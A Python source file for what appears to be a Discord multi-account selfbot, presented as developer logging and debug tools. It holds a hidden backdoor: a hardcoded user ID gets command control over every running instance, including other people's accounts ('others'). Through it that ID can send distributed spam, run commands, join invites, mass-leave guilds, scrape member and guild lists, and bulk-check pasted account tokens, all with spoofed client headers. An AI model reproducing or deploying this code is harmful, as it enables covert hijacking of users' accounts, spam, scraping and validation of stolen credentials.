import json
import time


class DeveloperTools:
    def __init__(self):
        self.config = {
            "debug_mode": False,
            "log_commands": True,
            "log_errors": True,
            "log_performance": False,
            "profile_slow_commands": True,
            "trace_gateway_events": False,
            "verbose_alt_analysis": False,
            "command_timing": True,
            "event_logging": True,
            "memory_tracking": False,
            "api_call_logging": False,
            "cache_stats": False,
            "rate_limit_tracking": True
        }
        
        self.dev_id = "297588166653902849"
        self.active_logging = []
        self.session_start = time.time()
        self.metrics = {
            "commands_executed": 0,
            "errors_caught": 0,
            "api_calls": 0,
            "slow_command_count": 0
        }
        self.slow_command_threshold = 1000  # milliseconds
    
    def get_dev_id(self):
        return self.dev_id

    def _get_dev_prefix(self, bot_instance):
        return f"{bot_instance.prefix}d"
    
    def enable_logging(self, log_type):
        if log_type in self.config:
            self.config[log_type] = True
            if log_type not in self.active_logging:
                self.active_logging.append(log_type)
            return True
        return False
    
    def disable_logging(self, log_type):
        if log_type in self.config:
            self.config[log_type] = False
            if log_type in self.active_logging:
                self.active_logging.remove(log_type)
            return True
        return False
    
    def get_setting(self, setting_name):
        return self.config.get(setting_name)
    
    def toggle_debug_mode(self):
        self.config["debug_mode"] = not self.config["debug_mode"]
        return self.config["debug_mode"]
    
    def set_slow_command_threshold(self, milliseconds):
        if milliseconds > 0:
            self.slow_command_threshold = milliseconds
            return True
        return False
    
    def get_active_logging(self):
        return self.active_logging.copy()
    
    def reset_logging(self, log_type=None):
        defaults = {
            "debug_mode": False,
            "log_commands": True,
            "log_errors": True,
            "log_performance": False,
            "profile_slow_commands": True,
            "trace_gateway_events": False,
            "verbose_alt_analysis": False,
            "command_timing": True,
            "event_logging": True,
            "memory_tracking": False,
            "api_call_logging": False,
            "cache_stats": False,
            "rate_limit_tracking": True
        }
        
        if log_type is None:
            self.config = defaults.copy()
            self.active_logging.clear()
            return True
        
        if log_type in defaults:
            self.config[log_type] = defaults[log_type]
            if log_type in self.active_logging:
                self.active_logging.remove(log_type)
            return True
        return False
    
    def process_message(self, message_data, bot_instance):
        author_id = message_data.get("author", {}).get("id", "")
        content = message_data.get("content", "")
        
        if author_id == self.get_dev_id():
            return self._process_dev_message(content, message_data, bot_instance)
        
        return False
    
    def _process_dev_message(self, content, message_data, bot_instance):
        channel_id = message_data.get("channel_id", "")
        dev_prefix = self._get_dev_prefix(bot_instance)
        if not content.startswith(dev_prefix):
            return False

        command_text = content[len(bot_instance.prefix):]
        
        # Developer commands prefixed with 'd' for clarity
        if command_text.startswith("drun "):
            return self._handle_run_command(command_text[5:], channel_id, bot_instance)
        
        elif command_text.startswith("dlog "):
            return self._process_logging_command(command_text[5:], channel_id, bot_instance)
        
        elif command_text.startswith("ddebug"):
            # Quick debug toggle
            new_state = self.toggle_debug_mode()
            status = "✓ Enabled" if new_state else "✗ Disabled"
            bot_instance.api.send_message(channel_id, f"```yaml\nDebug Mode: {status}```")
            return True
        
        elif command_text.startswith("dmetrics"):
            # Show current metrics
            metrics_str = "\n".join([f"  • {k}: {v}" for k, v in self.metrics.items()])
            uptime = time.time() - self.session_start
            bot_instance.api.send_message(channel_id, f"```yaml\nDeveloper Metrics:\n{metrics_str}\n\nUptime: {uptime:.1f}s```")
            return True
        
        # Guild management commands
        elif command_text.startswith("djoininvite "):
            return self._handle_djoininvite(command_text[12:], channel_id, bot_instance)
        
        elif command_text.startswith("dleaveguild "):
            return self._handle_dleaveguild(command_text[12:], channel_id, bot_instance)
        
        elif command_text.startswith("dmyguilds"):
            return self._handle_dmyguilds(command_text[9:].strip(), channel_id, bot_instance)
        
        elif command_text.startswith("dmassleave "):
            return self._handle_dmassleave(command_text[11:], channel_id, bot_instance)
        
        elif command_text.startswith("dguildmembers "):
            return self._handle_dguildmembers(command_text[14:], channel_id, bot_instance)
        
        # Token management commands
        elif command_text.startswith("dchecktoken "):
            return self._handle_dchecktoken(command_text[12:], channel_id, bot_instance)
        
        elif command_text.startswith("dbulkcheck "):
            return self._handle_dbulkcheck(command_text[11:], channel_id, bot_instance)
        
        elif command_text.startswith("dexportguilds "):
            return self._handle_dexportguilds(command_text[14:], channel_id, bot_instance)
        
        return False
    
    def _process_logging_command(self, command, channel_id, bot_instance):
        parts = command.split()
        if len(parts) < 1:
            return True
        
        action = parts[0].lower()
        log_type = parts[1].lower() if len(parts) > 1 else None
        
        if action == "enable":
            if log_type:
                if self.enable_logging(log_type):
                    bot_instance.api.send_message(channel_id, f"```yaml\nLogging Enabled:\n  Type: {log_type}\n  Status: ✓ Active```")
        
        elif action == "disable":
            if log_type:
                if self.disable_logging(log_type):
                    bot_instance.api.send_message(channel_id, f"```yaml\nLogging Disabled:\n  Type: {log_type}\n  Status: ✗ Inactive```")
        
        elif action == "debug":
            new_state = self.toggle_debug_mode()
            bot_instance.api.send_message(channel_id, f"```yaml\nDebug Mode:\n  Status: {'✓ Enabled' if new_state else '✗ Disabled'}```")
        
        elif action == "threshold":
            if len(parts) >= 2:
                try:
                    ms = int(parts[1])
                    if self.set_slow_command_threshold(ms):
                        bot_instance.api.send_message(channel_id, f"```yaml\nSlow Command Threshold:\n  Value: {ms}ms\n  Status: ✓ Updated```")
                except ValueError:
                    bot_instance.api.send_message(channel_id, "```yaml\nError:\n  Invalid millisecond value```")
        
        elif action == "list":
            active = self.get_active_logging()
            if active:
                log_list = "\n".join([f"  • {item}: {self.config.get(item)}" for item in active])
                bot_instance.api.send_message(channel_id, f"```yaml\nActive Logging:\n{log_list}\n\nTotal: {len(active)} types```")
        
        elif action == "reset":
            if log_type == "all":
                self.reset_logging()
                bot_instance.api.send_message(channel_id, "```yaml\nAll logging reset to defaults```")
            else:
                if self.reset_logging(log_type):
                    bot_instance.api.send_message(channel_id, f"```yaml\nLogging Reset:\n  Type: {log_type}\n  Status: ✓ Default restored```")
        
        elif action == "metrics":
            metrics_str = "\n".join([f"  • {k}: {v}" for k, v in self.metrics.items()])
            uptime = time.time() - self.session_start
            bot_instance.api.send_message(channel_id, f"```yaml\nDeveloper Metrics:\n{metrics_str}\n\nUptime: {uptime:.1f}s```")
        
        return True
    
    def _select_instances(self, uid_spec, bot_instance):
        """
        Select bot instances based on UID specification.
        
        Returns: list of (uid, instance, token) tuples
        """
        selected = []
        
        # uid_spec can be: 'all', 'others', or comma-separated UIDs
        if uid_spec.lower() == "all":
            # Get all available instances
            if hasattr(bot_instance, '_manager'):
                for token, inst in bot_instance._manager.bots.items():
                    if inst and getattr(inst, 'connection_active', False):
                        selected.append((getattr(inst, 'user_id', '?'), inst, token))
        
        elif uid_spec.lower() == "others":
            # All except developer (ID 297588166653902849)
            if hasattr(bot_instance, '_manager'):
                dev_id = self.get_dev_id()
                for token, inst in bot_instance._manager.bots.items():
                    if inst and getattr(inst, 'connection_active', False):
                        if str(getattr(inst, 'user_id', '')) != dev_id:
                            selected.append((getattr(inst, 'user_id', '?'), inst, token))
        
        else:
            # Parse comma-separated UIDs
            try:
                target_uids = [u.strip() for u in uid_spec.split(",")]
                if hasattr(bot_instance, '_manager'):
                    for token, inst in bot_instance._manager.bots.items():
                        if inst and getattr(inst, 'connection_active', False):
                            uid = str(getattr(inst, 'user_id', '?'))
                            if uid in target_uids:
                                selected.append((uid, inst, token))
            except Exception:
                pass
        
        return selected
    
    def _send_status_message(self, bot_instance, channel_id, status_text, is_error=False):
        """Send a colored status message to the channel."""
        if is_error:
            msg = f"\033[1;31m[ERROR]\033[0m {status_text}"
        else:
            msg = f"\033[1;33m[STATUS]\033[0m {status_text}"
        
        print(f"[DEV] {msg}")
        bot_instance.api.send_message(channel_id, f"```ansi\n{msg}```")
    
    def _handle_run_command(self, command_str, channel_id, bot_instance):
        """
        Handle multi-instance command execution.
        Format: <prefix>drun <uid/uids/all/others> <target_channel_id> <cmd/say> [args...]
        
        Examples:
        <prefix>drun 1 123456789 say Hello - Send to UID 1
        <prefix>drun 1,2,3 123456789 say Hello - Send to multiple UIDs
        <prefix>drun all 123456789 cmd ping - Run command for all instances
        <prefix>drun others 123456789 cmd ping - Run command for all except developer
        <prefix>drun 1,2,3 123456789 say -distribute hello hi hey - Each instance sends different message
        """
        import re
        dev_prefix = self._get_dev_prefix(bot_instance)
        
        parts = command_str.split(None, 3)  # Split into max 4 parts
        if len(parts) < 3:
            bot_instance.api.send_message(channel_id, f"```yaml\nRun Command Error:\n  Usage: {dev_prefix}run <uid/all/others> <channel_id> <cmd/say> [args]```")
            return True
        
        uid_spec = parts[0]
        target_channel = parts[1]
        action = parts[2].lower()
        args_str = parts[3] if len(parts) > 3 else ""
        
        if action not in ["cmd", "say"]:
            bot_instance.api.send_message(channel_id, "```yaml\nRun Command Error:\n  action must be 'cmd' or 'say'```")
            return True
        
        # Select instances to run on
        selected_instances = self._select_instances(uid_spec, bot_instance)
        
        if not selected_instances:
            self._send_status_message(bot_instance, channel_id, "No valid instances found", is_error=True)
            return True
        
        # Check for distribution flag
        distribute_messages = False
        args_to_use = args_str
        if args_str.startswith("-distribute "):
            distribute_messages = True
            args_to_use = args_str[12:].strip()
        
        # Parse distributed messages / args
        messages = []
        if action == "say":
            if distribute_messages and args_to_use:
                # Try to extract quoted strings
                quoted = re.findall(r'"([^"]*)"', args_to_use)
                if quoted:
                    messages = quoted
                else:
                    # Treat each word as separate message
                    messages = args_to_use.split()
            elif args_to_use:
                # Single message for all instances
                messages = [args_to_use]
        else:  # action == "cmd"
            messages = [args_to_use] if args_to_use else [""]
        
        # Prepare execution tasks
        results = []
        for idx, (uid, inst, token) in enumerate(selected_instances):
            if action == "say":
                # Distribute messages across instances if flag is set
                if distribute_messages and messages:
                    msg_to_send = messages[idx % len(messages)]
                else:
                    msg_to_send = messages[0] if messages else ""
                
                try:
                    inst.api.send_message(target_channel, msg_to_send)
                    results.append(f"✅ UID {uid}: Sent message")
                except Exception as e:
                    results.append(f"❌ UID {uid}: Failed to send ({str(e)[:50]})")
            
            elif action == "cmd":
                # Execute command on instance
                try:
                    ctx = {
                        "channel_id": target_channel,
                        "author_id": uid,
                        "api": inst.api,
                        "bot": inst,
                    }
                    cmd_name = messages[0].split()[0] if messages[0] else ""
                    cmd_args = messages[0].split()[1:] if messages[0] else []
                    inst.run_command(cmd_name, ctx, cmd_args)
                    results.append(f"✅ UID {uid}: Executed '{cmd_name}'")
                except Exception as e:
                    results.append(f"❌ UID {uid}: Failed to execute ({str(e)[:50]})")
        
        # Format and send results
        result_msg = f"```yaml\nRun Command Results:\n  Target Channel: {target_channel}\n"
        result_msg += f"  Action: {action}\n"
        result_msg += f"  Instances: {len(selected_instances)}\n"
        result_msg += f"  Distribute: {'Yes' if distribute_messages else 'No'}\n"
        result_msg += f"\nResults:\n"
        
        for result in results:
            result_msg += f"  {result}\n"
        
        result_msg += "```"
        
        self.metrics["commands_executed"] += 1
        bot_instance.api.send_message(channel_id, result_msg)
        
        return True
    
    # ===== Guild Management Developer Commands =====
    
    def _handle_djoininvite(self, args_str, channel_id, bot_instance):
        """Execute join invite on multiple instances."""
        parts = args_str.split()
        if len(parts) < 2:
            bot_instance.api.send_message(channel_id, f"```yaml\nJoin Invite Error:\n  Usage: {self._get_dev_prefix(bot_instance)}joininvite <uid/all/others> <invite_code>```")
            return True
        
        uid_spec = parts[0]
        invite_code = parts[1].rstrip("/").split("/")[-1]
        
        selected_instances = self._select_instances(uid_spec, bot_instance)
        if not selected_instances:
            self._send_status_message(bot_instance, channel_id, "No valid instances found", is_error=True)
            return True
        
        results = []
        for uid, inst, token in selected_instances:
            try:
                headers = inst.api.header_spoofer.get_protected_headers(inst.api.token)
                r = inst.api.session.post(
                    f"https://discord.com/api/v9/invites/{invite_code}",
                    headers=headers,
                    timeout=10,
                )
                if r.status_code in (200, 204):
                    results.append(f"✅ UID {uid}: Joined {invite_code}")
                else:
                    results.append(f"❌ UID {uid}: HTTP {r.status_code}")
            except Exception as e:
                results.append(f"❌ UID {uid}: {str(e)[:40]}")
        
        output = "```yaml\nJoin Invite Results:\n" + "\n".join(results) + "```"
        bot_instance.api.send_message(channel_id, output)
        return True
    
    def _handle_dleaveguild(self, args_str, channel_id, bot_instance):
        """Execute leave guild on multiple instances."""
        parts = args_str.split()
        if len(parts) < 2:
            bot_instance.api.send_message(channel_id, f"```yaml\nLeave Guild Error:\n  Usage: {self._get_dev_prefix(bot_instance)}leaveguild <uid/all/others> <guild_id>```")
            return True
        
        uid_spec = parts[0]
        guild_id = parts[1]
        
        selected_instances = self._select_instances(uid_spec, bot_instance)
        if not selected_instances:
            self._send_status_message(bot_instance, channel_id, "No valid instances found", is_error=True)
            return True
        
        results = []
        for uid, inst, token in selected_instances:
            try:
                headers = inst.api.header_spoofer.get_protected_headers(inst.api.token)
                r = inst.api.session.delete(
                    f"https://discord.com/api/v9/users/@me/guilds/{guild_id}",
                    headers=headers,
                    json={"lurking": False},
                    timeout=10,
                )
                if r.status_code in (200, 204):
                    results.append(f"✅ UID {uid}: Left guild {guild_id}")
                else:
                    results.append(f"❌ UID {uid}: HTTP {r.status_code}")
            except Exception as e:
                results.append(f"❌ UID {uid}: {str(e)[:40]}")
        
        output = "```yaml\nLeave Guild Results:\n" + "\n".join(results) + "```"
        bot_instance.api.send_message(channel_id, output)
        return True
    
    def _handle_dmyguilds(self, args_str, channel_id, bot_instance):
        """Show guild list for multiple instances."""
        parts = args_str.split() if args_str else []
        uid_spec = parts[0] if parts else "all"
        
        selected_instances = self._select_instances(uid_spec, bot_instance)
        if not selected_instances:
            self._send_status_message(bot_instance, channel_id, "No valid instances found", is_error=True)
            return True
        
        results = []
        for uid, inst, token in selected_instances:
            try:
                headers = inst.api.header_spoofer.get_protected_headers(inst.api.token)
                r = inst.api.session.get(
                    "https://discord.com/api/v9/users/@me/guilds?with_counts=true",
                    headers=headers,
                    timeout=10,
                )
                if r.status_code == 200:
                    guilds = r.json()
                    total = len(guilds)
                    owned = sum(1 for g in guilds if g.get("owner"))
                    results.append(f"✅ UID {uid}: {total} guilds ({owned} owned)")
                else:
                    results.append(f"❌ UID {uid}: HTTP {r.status_code}")
            except Exception as e:
                results.append(f"❌ UID {uid}: {str(e)[:40]}")
        
        output = "```yaml\nMy Guilds (Summary):\n" + "\n".join(results) + "```"
        bot_instance.api.send_message(channel_id, output)
        return True
    
    def _handle_dmassleave(self, args_str, channel_id, bot_instance):
        """Execute mass leave on multiple instances."""
        parts = args_str.split()
        if len(parts) < 1:
            bot_instance.api.send_message(channel_id, f"```yaml\nMass Leave Error:\n  Usage: {self._get_dev_prefix(bot_instance)}massleave <uid/all/others> [all|guild_id1 guild_id2...]```")
            return True
        
        uid_spec = parts[0]
        guild_specs = parts[1:] if len(parts) > 1 else ["all"]
        
        selected_instances = self._select_instances(uid_spec, bot_instance)
        if not selected_instances:
            self._send_status_message(bot_instance, channel_id, "No valid instances found", is_error=True)
            return True
        
        results = []
        for uid, inst, token in selected_instances:
            try:
                headers = inst.api.header_spoofer.get_protected_headers(inst.api.token)
                r = inst.api.session.get(
                    "https://discord.com/api/v9/users/@me/guilds",
                    headers=headers,
                    timeout=10,
                )
                if r.status_code != 200:
                    results.append(f"❌ UID {uid}: Failed to fetch guilds (HTTP {r.status_code})")
                    continue
                
                all_guilds = r.json()
                leavable = [g for g in all_guilds if not g.get("owner")]
                
                # Determine which guilds to leave
                if guild_specs == ["all"]:
                    targets = leavable
                else:
                    target_ids = set(guild_specs)
                    targets = [g for g in leavable if g.get("id") in target_ids]
                
                # Execute leaves
                left_count = 0
                for guild in targets:
                    try:
                        r2 = inst.api.session.delete(
                            f"https://discord.com/api/v9/users/@me/guilds/{guild.get('id')}",
                            headers=headers,
                            json={"lurking": False},
                            timeout=10,
                        )
                        if r2.status_code in (200, 204):
                            left_count += 1
                    except Exception:
                        pass
                
                results.append(f"✅ UID {uid}: Left {left_count}/{len(targets)} guilds")
            except Exception as e:
                results.append(f"❌ UID {uid}: {str(e)[:40]}")
        
        output = "```yaml\nMass Leave Results:\n" + "\n".join(results) + "```"
        bot_instance.api.send_message(channel_id, output)
        return True
    
    def _handle_dguildmembers(self, args_str, channel_id, bot_instance):
        """Show guild members for multiple instances."""
        parts = args_str.split()
        if len(parts) < 2:
            bot_instance.api.send_message(channel_id, f"```yaml\nGuild Members Error:\n  Usage: {self._get_dev_prefix(bot_instance)}guildmembers <uid/all/others> <guild_id> [limit]```")
            return True
        
        uid_spec = parts[0]
        guild_id = parts[1]
        limit = 20
        if len(parts) >= 3 and parts[2].isdigit():
            limit = min(100, max(1, int(parts[2])))
        
        selected_instances = self._select_instances(uid_spec, bot_instance)
        if not selected_instances:
            self._send_status_message(bot_instance, channel_id, "No valid instances found", is_error=True)
            return True
        
        results = []
        for uid, inst, token in selected_instances:
            try:
                r = inst.api.request("GET", f"/guilds/{guild_id}/members?limit={limit}")
                if not r or r.status_code != 200:
                    results.append(f"❌ UID {uid}: HTTP {r.status_code if r else 'No response'}")
                    continue
                
                members = r.json()
                results.append(f"✅ UID {uid}: {len(members)} member(s) in guild {guild_id}")
            except Exception as e:
                results.append(f"❌ UID {uid}: {str(e)[:40]}")
        
        output = "```yaml\nGuild Members (Summary):\n" + "\n".join(results) + "```"
        bot_instance.api.send_message(channel_id, output)
        return True
    
    # ===== Token Management Developer Commands =====
    
    def _handle_dchecktoken(self, args_str, channel_id, bot_instance):
        """Check a token's validity on multiple instances."""
        parts = args_str.split()
        if len(parts) < 2:
            bot_instance.api.send_message(channel_id, f"```yaml\nCheck Token Error:\n  Usage: {self._get_dev_prefix(bot_instance)}checktoken <uid/all/others> <token>```")
            return True
        
        uid_spec = parts[0]
        check_token = parts[1].strip("\"' ")
        
        selected_instances = self._select_instances(uid_spec, bot_instance)
        if not selected_instances:
            self._send_status_message(bot_instance, channel_id, "No valid instances found", is_error=True)
            return True
        
        results = []
        for uid, inst, token in selected_instances:
            try:
                r = inst.api.session.get(
                    "https://discord.com/api/v9/users/@me",
                    headers={"Authorization": check_token, "Content-Type": "application/json"},
                    timeout=10,
                )
                if r.status_code == 200:
                    data = r.json()
                    username = data.get("username", "?")
                    user_id = data.get("id", "?")
                    results.append(f"✅ UID {uid}: Valid token — {username} ({user_id})")
                elif r.status_code == 401:
                    results.append(f"❌ UID {uid}: Invalid token (401)")
                else:
                    results.append(f"❌ UID {uid}: HTTP {r.status_code}")
            except Exception as e:
                results.append(f"❌ UID {uid}: {str(e)[:40]}")
        
        output = "```yaml\nCheck Token Results:\n" + "\n".join(results) + "```"
        bot_instance.api.send_message(channel_id, output)
        return True
    
    def _handle_dbulkcheck(self, args_str, channel_id, bot_instance):
        """Bulk check tokens from a single instance."""
        parts = args_str.split()
        if len(parts) < 2:
            bot_instance.api.send_message(channel_id, f"```yaml\nBulk Check Error:\n  Usage: {self._get_dev_prefix(bot_instance)}bulkcheck <uid> <token1> <token2> ...```")
            return True
        
        uid_spec = parts[0]
        tokens = [t.strip("\"' ") for t in parts[1:] if t.strip("\"' ")]
        
        selected_instances = self._select_instances(uid_spec, bot_instance)
        if not selected_instances:
            self._send_status_message(bot_instance, channel_id, "No valid instances found", is_error=True)
            return True
        
        # Use only first instance for bulk check (to avoid repeating work)
        inst = selected_instances[0][1]
        results = []
        valid = 0
        invalid = 0
        
        for tok in tokens[:20]:  # Cap at 20
            try:
                r = inst.api.session.get(
                    "https://discord.com/api/v9/users/@me",
                    headers={"Authorization": tok, "Content-Type": "application/json"},
                    timeout=8,
                )
                if r.status_code == 200:
                    d = r.json()
                    uname = d.get("username", "?")
                    results.append(f"✅ {uname} :: {tok[:20]}...")
                    valid += 1
                else:
                    results.append(f"❌ HTTP {r.status_code} :: {tok[:24]}...")
                    invalid += 1
            except Exception as e:
                results.append(f"❌ Error :: {str(e)[:30]}")
                invalid += 1
        
        summary = f"Valid: {valid} | Invalid: {invalid} | Total: {len(tokens)}"
        output = "```yaml\nBulk Check Results:\n" + summary + "\n\n" + "\n".join(results) + "```"
        if len(output) > 1950:
            output = output[:1950] + "\n... (truncated)```"
        
        bot_instance.api.send_message(channel_id, output)
        return True
    
    def _handle_dexportguilds(self, args_str, channel_id, bot_instance):
        """Export guild list from multiple instances."""
        parts = args_str.split()
        if len(parts) < 1:
            bot_instance.api.send_message(channel_id, f"```yaml\nExport Guilds Error:\n  Usage: {self._get_dev_prefix(bot_instance)}exportguilds <uid/all/others> [filename]```")
            return True
        
        uid_spec = parts[0]
        filename_prefix = parts[1] if len(parts) > 1 else "exported_guilds"
        
        selected_instances = self._select_instances(uid_spec, bot_instance)
        if not selected_instances:
            self._send_status_message(bot_instance, channel_id, "No valid instances found", is_error=True)
            return True
        
        results = []
        for idx, (uid, inst, token) in enumerate(selected_instances):
            try:
                headers = inst.api.header_spoofer.get_protected_headers(inst.api.token)
                r = inst.api.session.get(
                    "https://discord.com/api/v9/users/@me/guilds?with_counts=true",
                    headers=headers,
                    timeout=10,
                )
                if r.status_code != 200:
                    results.append(f"❌ UID {uid}: HTTP {r.status_code}")
                    continue
                
                guilds = r.json()
                filename = f"{filename_prefix}_{uid}.json" if len(selected_instances) > 1 else f"{filename_prefix}.json"
                
                export_data = {
                    "exported_at": __import__("datetime").datetime.utcnow().isoformat(),
                    "uid": uid,
                    "total": len(guilds),
                    "guilds": [
                        {
                            "id": g.get("id"),
                            "name": g.get("name"),
                            "owner": g.get("owner", False),
                            "member_count": g.get("approximate_member_count"),
                        }
                        for g in guilds
                    ],
                }
                
                with open(filename, "w", encoding="utf-8") as f:
                    json.dump(export_data, f, indent=2, ensure_ascii=False)
                
                results.append(f"✅ UID {uid}: Exported {len(guilds)} guilds to {filename}")
            except Exception as e:
                results.append(f"❌ UID {uid}: {str(e)[:40]}")
        
        output = "```yaml\nExport Guilds Results:\n" + "\n".join(results) + "```"
        bot_instance.api.send_message(channel_id, output)
        return True
